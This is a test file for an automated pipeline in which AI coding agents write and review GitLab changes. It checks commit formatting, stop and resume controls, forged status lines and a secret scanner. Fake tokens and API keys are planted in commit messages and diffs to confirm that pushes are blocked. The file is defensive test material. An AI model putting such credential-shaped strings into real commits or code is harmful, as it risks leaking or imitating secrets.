  expect(w.commitMessage).toBe(`${MSG}\n\n${CLOSING}`);
  expect(w.mrTitle).toBe("feat(list): show a spinner while the list loads");
  const d = w.mrDescription;
  expect(d).toContain(`## Commit message\n\n${MSG}\n\n${CLOSING}`);
  expect(d.indexOf("Factory run 1:")).toBeLessThan(d.indexOf("## Commit message"));
  expect(d.indexOf("## Commit message")).toBeLessThan(d.indexOf("## Proof"));
  expect(w.record.steps.find((s) => s.step === "precommit-gate")?.data).toMatchObject({
    branch: "factory/8-add-a-loading-state", // the slug keeps the ticket title
    commit: { title: "feat(list): show a spinner while the list loads", message: `${MSG}\n\n${CLOSING}` },
  });
});
test("a missing or bad commit title falls back to the ticket title and keeps the body", async () => {
  const T = "Add a loading state";
  for (const [file, title, body] of [
    [undefined, T, ""],
    ["Added a spinner\n\n- Show a spinner.", T, "- Show a spinner."],
    ["Feat(list): show a spinner", T, ""],
    ["feat(list):show a spinner", T, ""],
    [`feat(list): ${"x".repeat(61)}`, T, ""], // 73 characters
    [`feat(list): ${"x".repeat(60)}`, `feat(list): ${"x".repeat(60)}`, ""], // 72 characters
    ["feat: show a spinner\r\n\r\n- Show it.", "feat: show a spinner", "- Show it."],
    ["refactor(list)!: drop the old loader", "refactor(list)!: drop the old loader", ""],
  ] as const) {
    const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, commitFile: file }));
    expect(w.mrTitle).toBe(title);
    expect(w.commitMessage).toBe([title, body, CLOSING].filter(Boolean).join("\n\n"));
  }
});
test("[AM], [skip ci] and [ci skip] never reach the branch commit or the MR", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, commitFile: "[AM] fix(list): stop the flicker [skip ci]\n\n- Keep the old rows [CI SKIP] until new ones load.\n- [am] Done." }));
  expect(w.mrTitle).toBe("fix(list): stop the flicker");
  for (const t of [w.commitMessage, w.mrDescription]) expect(t).not.toMatch(/\[AM\]|skip ci|ci skip/i);
});
test("[AM] in the ticket title never reaches the fallback title, and an [AM] at the line end keeps the body on its own line", async () => {
  const a = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, title: "[AM] fix x" }));
  for (const t of [a.commitMessage, a.mrTitle]) expect(t).not.toMatch(/\[AM\]/i);
  expect(a.mrTitle).toBe("fix x");
  const b = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, commitFile: "fix: x [AM]\n\n- body" }));
  expect(b.mrTitle).toBe("fix: x");
  expect(b.commitMessage).toContain("fix: x\n\n- body\n\n");
});
test("a [skip ci] nested in another [skip ci] does not survive the strip", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, title: "Fix [skip [ci skip]ci] list", commitFile: "fix: x [skip [ci skip]ci]\n\n- [ci [skip ci]skip] body" }));
  for (const t of [w.commitMessage, w.mrTitle, w.mrDescription]) expect(t).not.toMatch(/skip ci|ci skip/i);
  const v = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, title: "Fix [skip [ci skip]ci] list" }));
  expect(v.mrTitle).toBe("Fix  list");
});
test("a commit message that holds a secret blocks, and nothing is pushed", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, commitFile: "fix(list): stop the flicker\n\n- token=glpat-abcdefghijklmnopqrst1234" }));
  expect(w.states).toEqual(["blocked"]);
  expect(w.commitMessage).toBe("");
  expect(w.mrOpened).toBe(false);
});
test("the author is told to write run/commit-message.md, and to rewrite it after a fix", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[B], []] }));
  expect(w.claudeRuns[0].prompt).toContain("run/commit-message.md");
  expect(w.claudeRuns.find((j) => j.resume)?.prompt).toContain("run/commit-message.md");
});
test("the MR pipeline status is read for the reviewed head commit in risk-check and apply", async () => {
  const b = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" } }));
  expect(b.record.steps.find((s) => s.step === "risk-check")?.data).toMatchObject({ checks: "green" });
  const f = await runFinishPipeline(fakeWorld());
  expect(f.merged).toBe(true);
});

test("makeContext registers the secrets it holds, so no comment or push can carry them", () => {
  const dir = tmp();
  const file = (name: string, v: string) => (writeFileSync(join(dir, name), `${v}\n`), join(dir, name));
  const teams = "https://teams.example/webhook/0123456789";
  makeContext({ CI_SERVER_URL: GITLAB_URL, CI_PROJECT_ID: "3", FACTORY_PIPELINE: "build", FACTORY_TARGET: "react_frontend", BERGET_API_KEY: "berget-key-0123456789",
    TENSORX_API_KEY: "tensorx-key-0123456789", CLAUDE_CODE_OAUTH_TOKEN: "oauth-0123456789abcdef",
    FACTORY_GITLAB_TOKEN: file("gl", "gitlab-token-0123456789"), TEAMS_WEBHOOK_URL: file("teams", teams), FACTORY_DASHBOARD_TOKEN: file("dash", "dashboard-token-0123456789"), FACTORY_TRIGGER_TOKEN: file("trig", "trigger-0123456789") }, dir, seamsFile(dir, (t) => t.replace(/^ci: local$/m, "ci: gitlab")));
  for (const v of ["berget-key-0123456789", "tensorx-key-0123456789", "oauth-0123456789abcdef", "gitlab-token-0123456789", teams, "dashboard-token-0123456789", "trigger-0123456789"]) {
    expect(findSecrets(`text ${v} text`), v).toHaveLength(1);
  }
});
test("a Claude token in the diff is not pushed", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, diffText: "+const t = 'sk-ant-oat01-abcdef';" }));
  expect(w.commitMessage).toBe("");
  expect(w.states).toEqual(["blocked"]);
  expect(w.workItemComments.at(-1)).toContain("did not push");
});
test("a change blocked for a secret is not marked checked", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, diffText: "+const t = 'sk-ant-oat01-abcdef';" }));
  expect(w.tracker.tickets.get("8")!.marks).not.toContain("checked");
});

// The factory's own label changes and comments come back through the webhook. They must not start a run.
test("a factory-authored label change or comment stops at event, before triage, clone or install", async () => {
  const project = { path_with_namespace: "acme/web/react_frontend" };
  const user = { id: 1, username: BOT };
  const labelChange = { object_kind: "issue", user, project, object_attributes: { iid: 8 },
    changes: { labels: { previous: [{ title: "factory_ready" }], current: [{ title: "factory_running" }] } } };
  const comment = { object_kind: "note", user, project, object_attributes: { noteable_type: "Issue", note: "/label ~factory_ready" }, issue: { iid: 8 } };
  for (const payload of [labelChange, comment]) {
    const w = fakeWorld({ payload, state: "running" });
    w.tracker.parseEvent = makeGitLabTracker(undefined as never, project.path_with_namespace).parseEvent; // the real webhook parser
    await runBuildJobs(w);
    expect(w.record.steps.map((s) => s.step)).toEqual(["event"]);
    expect(w.record.steps[0].data).toMatchObject({ start: false, reason: "not-added" });
    expect(w.jevAsked).toBe(0);
    expect(w.ran).toEqual([]);
    expect(w.claudeCalls).toBe(0);
    expect(w.states).toEqual(["running"]);
  }
});

test("the author is told to implement the ticket, tests first, until lint, test and build pass, without committing", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" } }));
  const p = w.claudeRuns[0].prompt;
  expect(p).toMatch(/implement the ticket/);
  expect(p).toMatch(/tests first, then the code/);
  expect(p).toMatch(/until lint, test and build pass/);
  expect(p).toMatch(/Do not commit/);
});

test("the result comment shows the tokens used and the author's summary", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" } }));
  expect(w.record).toMatchObject({ tokens: { input: 100, output: 20 }, summary: "1. Which list?" });
  await resultSaved.run(w.ctx);
  expect(w.workItemComments.at(-1)).toContain("Tokens: 100 in, 20 out");
  expect(w.workItemComments.at(-1)).toContain("What changed: 1. Which list?");
});

test("a webhook label start stops when factory_ready is no longer on the work item", async () => {
  const w = await runBuildPipeline(fakeWorld({ state: null }));
  expect(w.record.steps.map((s) => s.step)).toEqual(["event"]);
  expect(w.record.steps[0].data).toMatchObject({ start: false, reason: "not-ready" });
  expect(w.states).toEqual([]);
});
test("a canceled, skipped or missing main pipeline blocks with no main pipeline, and does not revert", async () => {
  for (const mainPipeline of ["none", "running"] as const) {
    const w = await runFinishPipeline(fakeWorld({ mainPipeline }));
    expect(w.revertOpened).toBe(false);
    expect(w.states).toEqual(["blocked"]);
    expect(w.workItemComments.at(-1)).toContain("no main pipeline");
  }
});
test("the reviewer prompt holds the ticket wrapped once", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" } }));
  const p = reviewerPrompt(ticketText(w.ctx), "diff");
  expect(p.match(/<\/ticket>/g)).toHaveLength(1); // the prompt text itself names `<ticket>`, never the closing tag
});

// Review Focus 1: a record from before the router named a harness per role must not be resumed.
test("a resume of a record from an older factory version blocks", async () => {
  const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }));
  const old = { ...first.record, steps: first.record.steps.map((x) => (x.step === "triage" ? { ...x, data: { ...(x.data as object), row: { author: "claude-sonnet-5-5", effort: "medium", reviewer: "tensorx-deepseek-small", mayAutoMerge: true } } } : x)) };
  const w = resumeWorld({ jev1: { risk: "trivial" } }, { record: old });
  await runBuildJobs(w, tmp());
  expect(w.states).toEqual(["blocked"]);
  expect(w.workItemComments.at(-1)).toContain("older factory version");
  expect(w.restored).toEqual([]);
  expect(w.claudeRuns).toHaveLength(0);
});
// Review Focus 2: an adapter name not in the map fails before any adapter is built.
test("makeContext refuses an unknown adapter in seams.yml before it builds any", () => {
  const dir = tmp();
  const seams = join(dir, "seams.yml");
  writeFileSync(seams, readFileSync(fileURLToPath(new URL("../../seams.yml", import.meta.url)), "utf8").replace("tracker: gitlab", "tracker: jira"));
  writeFileSync(join(dir, "gl"), "glpat-x");
  expect(() => makeContext({ CI_SERVER_URL: GITLAB_URL, CI_PROJECT_ID: "3", FACTORY_PIPELINE: "build", FACTORY_TARGET: "react_frontend", FACTORY_GITLAB_TOKEN: join(dir, "gl") }, dir, seams)).toThrow("seams.yml tracker: unknown adapter jira");
  expect(existsSync(join(dir, "gl"))).toBe(true); // the CI adapter never ran, so it read no secret
  writeFileSync(seams, readFileSync(seams, "utf8").replace("tracker: jira", "tracker: toString"));
  expect(() => makeContext({ FACTORY_TARGET: "react_frontend" }, dir, seams)).toThrow("seams.yml tracker: unknown adapter toString");
  writeFileSync(seams, readFileSync(seams, "utf8").replace("tracker: toString", "tracker: gitlab").replace("logSource: files", "logSource: filez"));
  expect(() => makeContext({ FACTORY_TARGET: "react_frontend" }, dir, seams)).toThrow("seams.yml logSource: unknown adapter filez");
});
// chat: console needs no Teams webhook.
test("prepare patch and the questions agent clone the base branch", async () => {
  expect((await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" } }))).cloned).toEqual(["develop"]);
  expect((await runBuildPipeline(fakeWorld({ jev1: { clarity: 4 } }))).cloned).toEqual(["develop"]);
});
test("makeContext builds a context on the adapters seams.yml names", async () => {
  const dir = tmp();
  for (const k of ["gl", "dash"]) writeFileSync(join(dir, k), "x");
  const ctx = makeContext({ CI_SERVER_URL: GITLAB_URL, CI_PROJECT_ID: "3", FACTORY_PIPELINE: "build", FACTORY_TARGET: "react_frontend", FACTORY_WORK_ITEM_IID: "8", TENSORX_API_KEY: "k", FACTORY_GITLAB_TOKEN: join(dir, "gl"), FACTORY_DASHBOARD_TOKEN: join(dir, "dash") }, dir, seamsFile(dir));
  expect(typeof ctx.dashboard.send).toBe("function");
  expect(ctx.ci.vars.ticket).toBe("8");
  expect(await ctx.codeHost.baseBranch()).toBe("develop");
  expect(ctx.seams.tracker).toBe("gitlab");
  expect(Object.keys(ctx.harnesses).sort()).toEqual(["claude-code", "pi"]);
});
test("seams.yml judge: model-call builds the model judge from judgeModel, and needs that provider's key", () => {
  const dir = tmp();
  const seams = seamsFile(dir, (t) => t.replace("judge: jev-berget", "judge: model-call"));
  const files = () => { for (const k of ["gl", "teams", "dash"]) writeFileSync(join(dir, k), "x"); }; // a secret file is read once, then removed
  const env = { CI_SERVER_URL: GITLAB_URL, CI_PROJECT_ID: "3", FACTORY_PIPELINE: "build", FACTORY_TARGET: "react_frontend", FACTORY_WORK_ITEM_IID: "8", FACTORY_GITLAB_TOKEN: join(dir, "gl"), TEAMS_WEBHOOK_URL: join(dir, "teams"), FACTORY_DASHBOARD_TOKEN: join(dir, "dash") };
  files();
  expect(() => makeContext(env, dir, seams)).toThrow("TENSORX_API_KEY is not set");
  files();
  expect(makeContext({ ...env, TENSORX_API_KEY: "tx-key-0123456789" }, dir, seams).judge.provider).toBe("model");
});

// Task 8: the inbox. A stop comment ends an author run; a resume comment continues it.
const stopRecord = async (o: WorldOptions = {}) => runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "stop", ...o }));
const command = (c: "stop" | "resume", actor = "dev"): WorldOptions["payload"] => ({ kind: "command", ticket: "8", actor, command: c });
// The resume run: the ticket is stopped, the factory's own comment names the run, and that run's record is loadable.
async function resumeStopped(o: WorldOptions = {}, first?: { record: RunRecord }) {
  const stopped = first ?? (await stopRecord());
  const w = fakeWorld({ jev1: { risk: "trivial" }, state: "stopped", payload: command("resume"), ...o });
  await w.tracker.comment("8", `Stopped run: pipeline 1`);
  w.ci.buildRecord = async () => stopped.record;
  await runBuildJobs(w, tmp());
  return w;
}
test("an author run that finds @factory stop leaves the ticket stopped, keeps the session and names the run", async () => {
  const w = await stopRecord();
  expect(w.states).toEqual(["stopped"]);
  expect(w.workItemComments.at(-1)).toMatch(/^Stopped run: pipeline 1$/m);
  expect(w.record.steps.at(-1)).toMatchObject({ step: "prepare-patch", data: { sessionId: "sess-stop", stopped: true } });
  expect(w.cards).toHaveLength(0);
  expect(w.finishTriggered).toBe(false);
});
test("a stopped fix run in code review stops the run too", async () => {
  const w = await stopRecord({ prepare: "ok", reviews: [[B]], fixStop: true });
  expect(w.states).toEqual(["stopped"]);
  expect(w.record.steps.at(-1)).toMatchObject({ step: "code-review", data: { sessionId: "sess-stop", stopped: true } });
});
test("a stopped questions run stops the run", async () => {
  const w = await stopRecord({ jev1: { clarity: 4 } });
  expect(w.record.steps.at(-1)).toMatchObject({ step: "questions", data: { stopped: true } });
  expect(w.states).toEqual(["stopped"]);
});
test("author runs get the inbox; reviewer runs do not", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[B], []] }));
  expect(w.harness.jobs.filter((j) => j.role === "author").every((j) => j.inbox)).toBe(true);
  expect(w.harness.jobs.filter((j) => j.role === "reviewer").some((j) => j.inbox)).toBe(false);
});
test("@factory resume from a trusted person on a stopped ticket continues with the saved session", async () => {
  const w = await resumeStopped();
  expect(w.restored).toEqual(["1"]);
  expect(w.claudeRuns[0]).toMatchObject({ resume: "sess-stop" });
  expect(w.record.steps.filter((s) => s.step === "triage")).toHaveLength(1);
  expect(w.finishTriggered).toBe(true);
});
test("@factory resume from an untrusted person starts nothing", async () => {
  const w = await resumeStopped({ actorLevel: 20 });
  expect(w.states).toEqual(["stopped"]);
  expect(w.claudeCalls).toBe(0);
  expect(w.restored).toEqual([]);
  expect(w.record.steps.at(-1)).toMatchObject({ step: "event", data: { start: false, reason: "not-member" } });
});
test("@factory resume from the factory itself, or on a ticket that is not stopped, starts nothing", async () => {
  const bot = await resumeStopped({ payload: command("resume", BOT) });
  expect(bot.record.steps.at(-1)?.data).toMatchObject({ start: false, reason: "bot" });
  const running = await resumeStopped({ state: "running" });
  expect(running.record.steps.at(-1)?.data).toMatchObject({ start: false, reason: "not-stopped" });
  expect(running.claudeCalls).toBe(0);
});
test("@factory resume with no Stopped run comment from the factory blocks", async () => {
  const w = fakeWorld({ state: "stopped", payload: command("resume") });
  w.tracker.say("8", "dev", "Stopped run: pipeline 99"); // a person's line proves nothing
  w.ci.buildRecord = async () => (await stopRecord()).record; // so a forged line would get a record
  await runBuildJobs(w, tmp());
  expect(w.states).toEqual(["blocked"]);
  expect(w.claudeCalls).toBe(0);
});
test("@factory stop outside a run is ignored", async () => {
  for (const state of ["needs_info", "stopped"] as const) {
    const w = await runBuildPipeline(fakeWorld({ state, payload: command("stop") }));
    expect(w.record.steps.at(-1)?.data).toMatchObject({ start: false, reason: "not-running" });
    expect(w.states).toEqual([state]);
  }
});
test("@factory stop on a running ticket is left to the run's inbox", async () => {
  const w = await runBuildPipeline(fakeWorld({ state: "running", payload: command("stop") }));
  expect(w.record.steps.at(-1)?.data).toMatchObject({ start: false, reason: "in-run" });
  expect(w.states).toEqual(["running"]);
});
test("a stopped ticket holds a run slot", async () => {
  const w = fakeWorld({ otherRuns: 2, state: "stopped", payload: command("resume") });
  await w.tracker.comment("8", "Stopped run: pipeline 1");
  w.ci.buildRecord = async () => (await stopRecord()).record;
  await runBuildJobs(w, tmp());
  expect(w.states).toEqual(["stopped"]);
  expect(w.record.steps.at(-1)?.data).toMatchObject({ reason: "repo-full" });
});
// A stop posted between author runs (here during code review) must still stop the run before it merges.
test("a stop comment posted during code review leads to stopped, not a merge", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  const run = w.harness.run;
  w.harness.run = async (job) => {
    if (job.role === "reviewer") w.tracker.say("8", "dev", "@factory stop", new Date(Date.now() + 1000).toISOString());
    return run(job);
  };
  await runBuildPipeline(w);
  expect(w.finishTriggered).toBe(false);
  expect(w.states).toEqual(["stopped"]);
  expect(w.record.steps.at(-1)).toMatchObject({ step: "decision", data: { sessionId: "sess-1", stopped: true } });
  // The resumed run polls from its own start, so the old stop is not seen again.
  const r = fakeWorld({ jev1: { risk: "trivial" }, state: "stopped", payload: command("resume") });
  r.openChange();
  r.tracker.say("8", "dev", "@factory stop", w.record.steps.at(-1)!.at);
  await r.tracker.comment("8", "Stopped run: pipeline 1");
  r.ci.buildRecord = async () => w.record;
  await runBuildJobs(r, tmp());
  expect(r.finishTriggered).toBe(true);
});
test("a fix run's inbox sees a stop posted before it started, after the run began", async () => {
  vi.useFakeTimers({ toFake: ["Date"] });
  const w = fakeWorld({ jev1: { risk: "trivial" }, reviews: [[B], []] });
  const run = w.harness.run;
  w.harness.run = async (job) => {
    if (job.role === "reviewer" && w.harness.jobs.length < 3) {
      w.tracker.say("8", "dev", "@factory stop", new Date(Date.now() + 1000).toISOString());
      vi.setSystemTime(Date.now() + 2000); // the fix run starts after the comment
    }
    return run(job);
  };
  await runBuildPipeline(w).finally(() => vi.useRealTimers());
  const fixRun = w.harness.jobs.find((j) => j.role === "author" && j.resume);
  expect((await fixRun!.inbox!.poll()).stop).toBe(true);
});
// Task B5: a stop from the dashboard reaches the author run through its inbox.
test("a stop from the dashboard stops the author run and keeps its session", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  w.ctx.dashboard = fakeDashboard({ stop: true });
  const run = w.harness.run;
  w.harness.run = async (job) => (job.inbox && (await job.inbox.poll()).stop ? { ...(await run(job)), session: "sess-d", ok: false, stopped: true } : run(job));
  await runBuildPipeline(w);
  expect(w.states).toEqual(["stopped"]);
  expect(w.record.steps.at(-1)).toMatchObject({ step: "prepare-patch", data: { sessionId: "sess-d", stopped: true } });
  expect(parseStoppedNote(w.workItemComments.at(-1)!)?.reason).toBe("stopped from the dashboard");
});
test("a watcher ticket set ready by the factory starts a run; another ticket set ready by the factory does not", async () => {
  const ready = { kind: "ready", ticket: "8", actor: BOT };
  const w = fakeWorld({ jev1: { risk: "trivial" }, payload: ready });
  w.tracker.tickets.get("8")!.marks = ["watcher"];
  await runBuildPipeline(w);
  expect(w.record.steps[0]).toMatchObject({ step: "event", data: { start: true } });
  const other = await runBuildPipeline(fakeWorld({ payload: ready }));
  expect(other.record.steps[0]).toMatchObject({ step: "event", data: { start: false } });
  expect(other.claudeCalls).toBe(0);
  // The poller's way in: no payload, the ticket says who set it ready.
  const polled = fakeWorld({ jev1: { risk: "trivial" } });
  polled.ci.vars = { ...polled.ci.vars, payload: undefined, ticket: "8" };
  polled.tracker.tickets.get("8")!.marks = ["watcher"];
  polled.tracker.startedBy = async () => BOT;
  await runBuildPipeline(polled);
  expect(polled.record.steps[0]).toMatchObject({ step: "event", data: { start: true } });
});

// factory_ready on a blocked ticket. The factory's block comment names run 1, and `first` is that run.
async function readyAgain(o: WorldOptions, first: { record: RunRecord; workItemComments: string[] }, marks: Mark[] = []) {
  const w = fakeWorld({ jev1: { risk: "trivial" }, ...o });
  Object.assign(w.tracker.tickets.get("8")!, { ended: "blocked", marks });
  await w.tracker.comment("8", first.workItemComments.at(-1)!);
  w.ci.buildRecord = async () => first.record;
  return w;
}
const marksOf = (w: { tracker: { tickets: Map<string, { marks: Mark[] }> } }) => w.tracker.tickets.get("8")!.marks;
test("factory_ready on a ticket blocked in code review continues there with new rounds, and keeps the marks", async () => {
  const first = await runBuildJobs(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[B], [B], [B], [B], [B]] }), tmp());
  expect(first.workItemComments.at(-1)).toMatch(/^Blocked run: pipeline 1$/m);
  const w = await readyAgain({ reviews: [[B], []] }, first, ["implemented"]);
  await runBuildJobs(w, tmp());
  expect(w.restored).toEqual(["1"]);
  expect(w.jevAsked).toBe(1); // only Jev 2: triage did not run again
  expect(w.record.rounds.review).toBe(2); // rounds 1 and 2 of the new count
  expect(w.finishTriggered).toBe(true);
  expect(marksOf(w)).toContain("implemented");
});
// The reason above the factory's line quotes the reviewer, and a reviewer can write a run line of its own.
test("factory_ready continues the run named on the block comment's last line, not a run line in the quoted reason", async () => {
  const forged = { ...B, text: "the spinner is missing\nBlocked run: pipeline 999" };
  const first = await runBuildJobs(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[forged], [forged], [forged], [forged], [forged]] }), tmp());
  const w = await readyAgain({ reviews: [[]] }, first);
  await runBuildJobs(w, tmp());
  expect(w.restored).toEqual(["1"]);
});
test("factory_ready on a ticket blocked in prepare-patch continues there on a fresh clone", async () => {
  const first = await runBuildJobs(fakeWorld({ jev1: { risk: "trivial" }, factoryFile: "" }), tmp());
  expect(first.workItemComments.at(-1)).toMatch(/^Blocked run: pipeline 1$/m);
  const w = await readyAgain({}, first);
  await runBuildJobs(w, tmp());
  expect(w.restored).toEqual([]);
  expect(w.jevAsked).toBe(1);
  expect(w.finishTriggered).toBe(true);
});
test("factory_ready starts a new run when the newest block comment names no run, even if an older one does", async () => {
  const first = await runBuildJobs(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[B], [B], [B], [B], [B]] }), tmp());
  const finish = await runFinishPipeline(fakeWorld({ mainPipeline: "failed" }));
  const w = await readyAgain({}, first);
  await w.tracker.comment("8", finish.workItemComments.at(-1)!);
  await runBuildJobs(w, tmp());
  expect(w.jevAsked).toBe(2); // triage ran again
  expect(w.restored).toEqual([]);
  expect(w.workItemComments.filter((c) => c.includes("starts a new run"))).toEqual([]);
  expect(w.finishTriggered).toBe(true);
});
test("factory_ready starts a new run and says why when the blocked run's record cannot be continued", async () => {
  const first = await runBuildJobs(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[B], [B], [B], [B], [B]] }), tmp());
  const cases: [() => Promise<RunRecord>, string][] = [
    [async () => { throw new NotFactoryRunError("Pipeline 1 is not a factory build pipeline"); }, "could not be loaded (Error: Pipeline 1 is not a factory build pipeline)"],
    [async () => ({ ...first.record, workItem: "acme/web/react_frontend#9" }), "is for another ticket"],
    [async () => ({ ...first.record, steps: first.record.steps.slice(0, -1) }), "does not show which step blocked"],
  ];
  for (const [buildRecord, why] of cases) {
    const w = await readyAgain({}, first);
    w.ci.buildRecord = buildRecord;
    await runBuildJobs(w, tmp());
    expect(w.workItemComments.filter((c) => c.includes("starts a new run"))).toEqual([`The factory starts a new run, because it cannot continue the blocked run: the record of pipeline 1 ${why}.`]);
    expect(w.restored).toEqual([]);
    expect(w.record.steps.filter((s) => s.step === "triage")).toHaveLength(1); // the new run's record, not the old one
    expect(w.finishTriggered).toBe(true);
  }
});
// A crashed job fails its pipeline, so no decision job uploads the record that a run line would point to.
test("a crash block names no run, so factory_ready after it starts a new run with no comment", async () => {
  const crashed = fakeWorld({ jev1: { risk: "trivial" } });
  const run = crashed.harness.run;
  crashed.harness.run = async (job) => { if (job.role === "reviewer") throw new Error("reviewer crashed"); return run(job); };
  await expect(runBuildJobs(crashed, tmp())).rejects.toThrow("reviewer crashed");
  expect(crashed.workItemComments.at(-1)).toBe("The factory stopped. A person must look at this.\n\nThe code-review step failed: Error: reviewer crashed");
  const w = await readyAgain({}, crashed);
  w.ci.buildRecord = async () => { throw new Error("Pipeline 1 has no successful decision job"); };
  await runBuildJobs(w, tmp());
  expect(w.workItemComments.filter((c) => c.includes("starts a new run"))).toEqual([]);
  expect(w.jevAsked).toBe(2); // triage ran again
  expect(w.finishTriggered).toBe(true);
});
// Only a crash blocks at risk-check, and a crash names no run, so this test writes the run line itself.
test("a run continued at risk-check puts its own run on the change, so a person's merge starts finish with it", async () => {
  const first = fakeWorld({ jev1: { risk: "medium" } });
  first.host.checks = async () => { throw new Error("GitLab GET failed with status 500"); };
  await runBuildJobs(first, tmp()).catch(() => {});
  const w = await readyAgain({ jev1: { risk: "medium" } }, { record: first.record, workItemComments: ["The factory stopped. A person must look at this.\n\nThe risk-check step failed.\n\nBlocked run: pipeline 1"] });
  w.openChange("Factory run 1: https://ci.example/runs/1");
  w.ci.vars = { ...w.ci.vars, run: "2", runUrl: "https://ci.example/runs/2" };
  await runBuildJobs(w, tmp());
  expect(w.states).toEqual(["needs_approval"]);
  w.ci.vars = { ...w.ci.vars, payload: mrEvent() };
  await event.run(w.ctx);
  expect(w.finishVars).toMatchObject({ kind: "finish", buildRun: "2" });
});
test("a new run removes the earlier run's marks except watcher", async () => {
  const w = fakeWorld();
  w.tracker.tickets.get("8")!.marks = ["watcher", "implemented", "reviewed", "risk_high"];
  await event.run(w.ctx);
  expect(marksOf(w)).toEqual(["watcher"]);
});
test("triage sets its risk mark and removes another risk mark", async () => {
  const w = fakeWorld({ jev1: { risk: "low" } });
  w.ci.vars.ticket = "8";
  w.tracker.tickets.get("8")!.marks = ["risk_high"];
  await triage.run(w.ctx);
  expect([...marksOf(w)].sort()).toEqual(["risk_low", "triaged"]);
});
test("the work item is marked merged after the factory's merge or a person's", async () => {
  expect(marksOf(await runFinishPipeline(fakeWorld()))).toEqual(["merged"]);
  expect(marksOf(await runFinishPipeline(fakeWorld({ mrState: "merged" }), { decision: "needs_approval", skipApply: true }))).toEqual(["merged"]);
});
test("a red main pipeline after the merge marks the work item reverted", async () => {
  expect(marksOf(await runFinishPipeline(fakeWorld({ mainPipeline: "failed" })))).toEqual(["merged", "reverted"]);
});
test("a failed Jev 2 check leaves the work item without risk_checked", async () => {
  expect(marksOf(await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, jev2: "throw" })))).not.toContain("risk_checked");
});

// A gate fix is code no review saw: the change goes back to code review.
test("a gate fix sends the change back to code review; a gate with no fix does not", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, lintFails: 1, reviews: [[], []] }));
  expect(w.reviewsRun).toBe(2);
  expect(w.record.rounds).toEqual({ review: 2, gate: 2 });
  expect(marksOf(w)).toContain("reviewed");
  expect(w.finishTriggered).toBe(true);
  expect((await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[], []] }))).reviewsRun).toBe(1);
});
test("a review fix after a gate fix runs the gate again", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, lintFails: 1, reviews: [[], [B], []] }));
  expect(w.reviewsRun).toBe(3);
  expect(w.ran.filter((c) => c === "pnpm lint")).toHaveLength(3);
  expect(w.finishTriggered).toBe(true);
});
test("a review after a gate fix that never passes blocks, and the reviewed mark is gone", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, lintFails: 1, reviews: [[], [B], [B], [B], [B]] }));
  expect(w.states).toEqual(["blocked"]);
  expect(marksOf(w)).not.toContain("reviewed");
});
// 5 review rounds are used before the gate fix, so the review after it is a check only.
test("a check-only review after a gate fix that fails blocks after 5 rounds, not 6", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, lintFails: 1, reviews: [[B], [B], [B], [B], [], [B]] }));
  expect(w.workItemComments.at(-1)).toBe("The factory stopped. A person must look at this.\n\nCode review did not pass after 5 rounds. Open findings:\n\n- the list never shows the spinner");
  expect(w.record.rounds.review).toBe(5);
});
// 5 gate rounds are used before the review fix, so the gate after it is a check only.
test("a check-only gate after a review fix counts 5 rounds, not 6", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, lintFails: 4, reviews: [[], [B], []] }));
  expect(w.record.rounds).toEqual({ review: 3, gate: 5 });
  expect(w.finishTriggered).toBe(true);
});
test("a resumed gate job reviews the change again", async () => {
  const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, lintFails: 1, fixLimit: true }));
  expect(first.states).toEqual(["waiting"]);
  const w = resumeWorld({ jev1: { risk: "trivial" }, reviews: [[]] }, first);
  await runBuildJobs(w, tmp());
  expect(w.reviewsRun).toBe(1);
  expect(w.finishTriggered).toBe(true);
});

// Spec 12: a screen the reviewer says does not match blocks the change.
const PREVIEW = "install: pnpm install\nlint: pnpm lint\ntest: pnpm test:unit\nbuild: pnpm build\npreview: pnpm dev\npreviewUrl: http://localhost:3000\n";
const reviewOf = (verdict: string): Finding => ({ blocking: false, screen: "list page", verdict, text: "no spinner" });
const reviewData = (w: ReturnType<typeof fakeWorld>) => w.record.steps.find((s) => s.step === "code-review")?.data as any;
test("a does_not_match verdict blocks", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, proof: VISUAL_PROOF, factoryFile: PREVIEW, reviews: Array.from({ length: 5 }, () => [reviewOf("does_not_match")]) }));
  expect(w.states).toEqual(["blocked"]);
  expect(w.workItemComments.at(-1)).toContain("Code review did not pass after 5 rounds");
  expect(w.workItemComments.at(-1)).toContain("no spinner");
});
